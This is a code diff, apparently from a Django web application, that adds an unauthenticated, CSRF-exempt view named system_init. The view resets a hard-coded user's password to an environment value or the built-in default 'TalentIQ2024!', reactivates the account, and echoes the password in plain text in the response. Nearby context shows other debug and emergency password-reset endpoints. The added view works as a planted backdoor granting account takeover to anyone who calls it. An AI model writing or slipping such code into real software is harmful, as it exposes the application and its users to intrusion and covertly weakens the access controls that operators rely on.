@@ -100,6 +100,21 @@ def debug_login(request):
 from django.views.decorators.csrf import csrf_exempt
 
 @csrf_exempt
+def system_init(request):
+    import os
+    from django.http import HttpResponse
+    from .models import User
+    password = os.environ.get("ADMIN_PASSWORD", "TalentIQ2024!")
+    try:
+        user = User.objects.get(email__iexact="ngaspar10@gmail.com")
+        user.set_password(password)
+        user.is_active = True
+        user.save()
+        return HttpResponse(f"OK: {password}", content_type="text/plain")
+    except User.DoesNotExist:
+        return HttpResponse("User not found.", content_type="text/plain")
+
+
 def reset_admin_password(request):
     """Emergency recovery: set admin password directly without needing the old one."""
     import os
